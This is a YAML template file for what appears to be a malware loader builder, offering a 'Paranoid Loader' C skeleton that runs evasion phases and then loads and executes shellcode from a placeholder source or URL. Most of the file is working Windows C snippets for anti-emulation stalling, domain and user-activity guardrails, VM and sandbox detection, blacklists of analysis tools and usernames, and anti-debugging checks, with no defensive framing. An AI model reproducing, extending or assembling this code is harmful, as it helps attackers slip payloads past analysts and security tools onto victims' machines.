templates:
  - id: "paranoid"
    display: "Paranoid Loader"
    description: "Every protection enabled - layered defense in depth."
    content: |
      #define WIN32_LEAN_AND_MEAN
      #include <windows.h>
      #include <winternl.h>
      #include <intrin.h>
      #include <tlhelp32.h>
      #include <shlobj.h>
      #include <iphlpapi.h>
      #include <lm.h>
      #pragma comment(lib, "iphlpapi.lib")
      #pragma comment(lib, "netapi32.lib")

      {{PROCESS_LOOKUP_HELPER}}

      // Watchdog thread
      volatile BOOL g_SafeToRun = TRUE;

      DWORD WINAPI WatchdogThread(LPVOID lpParam) {
          while (g_SafeToRun) {
              // Check debugger continuously
              if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }
              
              // Check hardware breakpoints
              CONTEXT ctx = {0};
              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
              if (GetThreadContext(GetCurrentThread(), &ctx)) {
                  if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }
              }
              
              // Check for analysis tools
              const wchar_t* tools[] = {
                  L"x64dbg.exe", L"ida.exe", L"idaq64.exe", L"procmon.exe",
                  L"wireshark.exe", L"fiddler.exe", L"ProcessHacker.exe"
              };
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (snap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe = {sizeof(pe)};
                  if (Process32FirstW(snap, &pe)) {
                      do {
                          for (int i = 0; i < 7; i++) {
                              if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {
                                  CloseHandle(snap);
                                  g_SafeToRun = FALSE;
                                  ExitProcess(0);
                              }
                          }
                      } while (Process32NextW(snap, &pe));
                  }
                  CloseHandle(snap);
              }
              
              Sleep(500);
          }
          return 0;
      }

      INT main(VOID)
      {
          // Start watchdog
          CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);

          // Phase 1: Anti-Emulation
          {{ANTI_EMULATION}}
          if (!g_SafeToRun) return 0;

          // Phase 2: Environment Validation
          {{GUARDRAILS}}
          if (!g_SafeToRun) return 0;

          // Phase 3: VM/Sandbox Detection
          {{ANTI_SANDBOX}}
          if (!g_SafeToRun) return 0;

          // Phase 4: Anti-Debugging
          {{ANTI_DEBUGGING}}
          if (!g_SafeToRun) return 0;

          // Phase 5: Anti-Analysis
          {{ANTI_ANALYSIS}}
          if (!g_SafeToRun) return 0;

          // Phase 6: Load Payload
          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_URL}}

          // Phase 7: Execute
          {{SHELLCODE_EXECUTION}}

          return 0;
      }
    placeholders:
      - name: "PROCESS_LOOKUP_HELPER"
        kind: system
      - name: "ANTI_EMULATION"
        kind: snippet
        snippetTemplate: "antiemulation"
      - name: "GUARDRAILS"
        kind: snippet
        snippetTemplate: "guardrail"
      - name: "ANTI_SANDBOX"
        kind: snippet
        snippetTemplate: "antisandbox"
      - name: "ANTI_DEBUGGING"
        kind: snippet
        snippetTemplate: "antidebugging"
      - name: "ANTI_ANALYSIS"
        kind: snippet
        snippetTemplate: "antianalysis"
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_URL"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "shellcodeexecution"

sections:
  # --------------------------------------------------------------------------
  # ANTI-EMULATION - MAXIMUM
  # --------------------------------------------------------------------------
  - header: "Anti Emulation"
    template: "antiemulation"
    display: "Anti-Emulation"
    allowMultiple: true
    items:
      - id: "MaxMemoryExhaustion"
        display: "Maximum Memory Exhaustion"
        default: true
        snippet: |
          // Maximum memory allocation stress
          {
              const int COUNT = 250;
              const int ITERS = 15;
              const int SIZE = 32768;
              void* allocs[250];
              DWORD prot;
              
              for(int iter = 0; iter < ITERS; iter++) {
                  for(int n = 0; n < COUNT; n++) {
                      allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                      if (allocs[n]) {
                          volatile BYTE *p = (BYTE*)allocs[n];
                          for(int j = 0; j < SIZE; j += 256) {
                              p[j] = (BYTE)((j * iter) ^ n);
                          }
                      }
                  }
                  for(int n = 0; n < COUNT; n++) {
                      if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);
                  }
                  for(int n = 0; n < COUNT; n++) {
                      if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
                  }
              }
          }

      - id: "ExtendedTimeDelay"
        display: "Extended Time Delay (15s)"
        default: true
        snippet: |
          // 15 second busy delay
          {
              DWORD start = *(DWORD*)0x7ffe0320;
              while (*(DWORD*)0x7ffe0320 - start < 15000) {
                  volatile int x = 0;
                  for (int i = 0; i < 10000; i++) x += i;
              }
          }

      - id: "CpuStress"
        display: "CPU Stress Test"
        default: true
        snippet: |
          // Heavy CPU computation
          {
              volatile unsigned int r = 0xDEADBEEF;
              for (unsigned int i = 0; i < 200000000; i++) {
                  r = (r << 1) | (r >> 31);
                  r ^= i;
                  r = (r * 7) + 13;
              }
              if (r == 0) Sleep(1);
          }

      - id: "FLSStress"
        display: "FLS Callback Stress"
        default: false
        snippet: |
          // Stress FLS callbacks
          {
              for (int round = 0; round < 50; round++) {
                  volatile BOOL called = FALSE;
                  auto cb = [](PVOID p) -> VOID { *(volatile BOOL*)p = TRUE; };
                  DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
                  if (idx != FLS_OUT_OF_INDEXES) {
                      FlsSetValue(idx, (PVOID)&called);
                      FlsFree(idx);
                      if (!called) return 0;
                  }
              }
          }

  # --------------------------------------------------------------------------
  # GUARDRAILS - STRICT VALIDATION
  # --------------------------------------------------------------------------
  - header: "Guardrails"
    template: "guardrail"
    display: "Guardrails"
    allowMultiple: true
    items:
      - id: "DomainMembership"
        display: "Require Domain Membership"
        default: true
        snippet: |
          {
              LPWSTR domain = NULL;
              NETSETUP_JOIN_STATUS status;
              if (NetGetJoinInformation(NULL, &domain, &status) == NERR_Success) {
                  BOOL isDomain = (status == NetSetupDomainName);
                  NetApiBufferFree(domain);
                  if (!isDomain) return 0;
              }
          }

      - id: "UserActivity"
        display: "Require User Activity"
        default: true
        snippet: |
          {
              LASTINPUTINFO lii = {sizeof(lii)};
              if (GetLastInputInfo(&lii)) {
                  DWORD idle = (GetTickCount() - lii.dwTime) / 1000;
                  if (idle > 1800) return 0; // 30 min idle = suspicious
              }
          }

      - id: "MinRecentFiles"
        display: "Require Recent User Files"
        default: true
        snippet: |
          {
              WCHAR recent[MAX_PATH];
              if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recent))) {
                  WIN32_FIND_DATAW fd;
                  WCHAR search[MAX_PATH];
                  wsprintfW(search, L"%s\\*", recent);
                  HANDLE hf = FindFirstFileW(search, &fd);
                  int count = 0;
                  if (hf != INVALID_HANDLE_VALUE) {
                      do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++; }
                      while (FindNextFileW(hf, &fd) && count < 20);
                      FindClose(hf);
                  }
                  if (count < 5) return 0;
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-SANDBOX - COMPREHENSIVE
  # --------------------------------------------------------------------------
  - header: "Anti Sandbox"
    template: "antisandbox"
    display: "Anti-Sandbox/VM"
    allowMultiple: true
    items:
      - id: "AllVMChecks"
        display: "All VM Detection Methods"
        default: true
        snippet: |
          // Comprehensive VM detection
          {
              // CPUID hypervisor bit
              int cpu[4];
              __cpuid(cpu, 1);
              if (cpu[2] & (1 << 31)) return 0;

              // CPUID VM vendor
              __cpuid(cpu, 0x40000000);
              char vendor[13] = {0};
              memcpy(vendor, &cpu[1], 4);
              memcpy(vendor + 4, &cpu[2], 4);
              memcpy(vendor + 8, &cpu[3], 4);
              if (strstr(vendor, "VMware") || strstr(vendor, "VBox") || 
                  strstr(vendor, "Microsoft Hv") || strstr(vendor, "KVM")) return 0;

              // Resources
              MEMORYSTATUSEX mem = {sizeof(mem)};
              GlobalMemoryStatusEx(&mem);
              if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 0; // < 4GB

              SYSTEM_INFO si;
              GetSystemInfo(&si);
              if (si.dwNumberOfProcessors < 2) return 0;

              ULARGE_INTEGER disk;
              GetDiskFreeSpaceExW(L"C:\\", NULL, &disk, NULL);
              if (disk.QuadPart < 80ULL * 1024 * 1024 * 1024) return 0; // < 80GB

              // Screen
              if (GetSystemMetrics(SM_CXSCREEN) < 1280) return 0;
              if (GetSystemMetrics(SM_CYSCREEN) < 720) return 0;
          }

      - id: "ProcessBlacklist"
        display: "Process Blacklist (Extended)"
        default: true
        snippet: |
          {
              const wchar_t* blacklist[] = {
                  L"vmtoolsd.exe", L"vmwaretray.exe", L"vboxservice.exe", L"vboxtray.exe",
                  L"procmon.exe", L"procexp.exe", L"wireshark.exe", L"fiddler.exe",
                  L"x64dbg.exe", L"x32dbg.exe", L"ollydbg.exe", L"idaq.exe", L"idaq64.exe",
                  L"sandboxie.exe", L"sniff_hit.exe", L"sysmon.exe", L"joeboxcontrol.exe",
                  L"hookanaapp.exe", L"dumpcap.exe", L"importrec.exe"
              };
              
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (snap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe = {sizeof(pe)};
                  if (Process32FirstW(snap, &pe)) {
                      do {
                          for (int i = 0; i < 20; i++) {
                              if (_wcsicmp(pe.szExeFile, blacklist[i]) == 0) {
                                  CloseHandle(snap);
                                  return 0;
                              }
                          }
                      } while (Process32NextW(snap, &pe));
                  }
                  CloseHandle(snap);
              }
          }

      - id: "UsernameBlacklist"
        display: "Username Blacklist"
        default: true
        snippet: |
          {
              WCHAR user[256];
              DWORD size = 256;
              GetUserNameW(user, &size);
              _wcslwr_s(user, 256);
              
              const wchar_t* badUsers[] = {
                  L"sandbox", L"malware", L"virus", L"sample", L"test",
                  L"analysis", L"cuckoo", L"vmware", L"user", L"john doe"
              };
              for (int i = 0; i < 10; i++) {
                  if (wcsstr(user, badUsers[i])) return 0;
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-DEBUGGING - ALL TECHNIQUES
  # --------------------------------------------------------------------------
  - header: "Anti Debugging"
    template: "antidebugging"
    display: "Anti-Debugging"
    allowMultiple: true
    items:
      - id: "FullAntiDebug"
        display: "Full Anti-Debug Suite"
        default: true
        snippet: |
          // Complete anti-debug implementation
          {
              // 1. IsDebuggerPresent
              if (IsDebuggerPresent()) ExitProcess(0);
              
              // 2. CheckRemoteDebuggerPresent
              BOOL remote = FALSE;
              CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
              if (remote) ExitProcess(0);
              
              // 3. PEB flags
              #ifdef _WIN64
              PPEB peb = (PPEB)__readgsqword(0x60);
              DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);
              #else
              PPEB peb = (PPEB)__readfsdword(0x30);
              DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);
              #endif
              if (peb->BeingDebugged) ExitProcess(0);
              if (ntg & 0x70) ExitProcess(0);
              
              // 4. Hardware breakpoints
              CONTEXT ctx = {0};
              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
              GetThreadContext(GetCurrentThread(), &ctx);
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
              
              // 5. RDTSC timing
              unsigned __int64 t1 = __rdtsc();
              volatile int x = 0; for (int i = 0; i < 100; i++) x++;
              if (__rdtsc() - t1 > 0x100000) ExitProcess(0);
              
              // 6. Debug port
              typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
              pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
              if (NtQIP) {
                  HANDLE port = NULL;
                  NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);
                  if (port) ExitProcess(0);
                  
                  ULONG flags = 0;
                  NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags
                  if (flags == 0) ExitProcess(0);
              }
              
              // 7. OutputDebugString
              SetLastError(0);
              OutputDebugStringA("X");
              if (GetLastError() == 0) ExitProcess(0);
          }

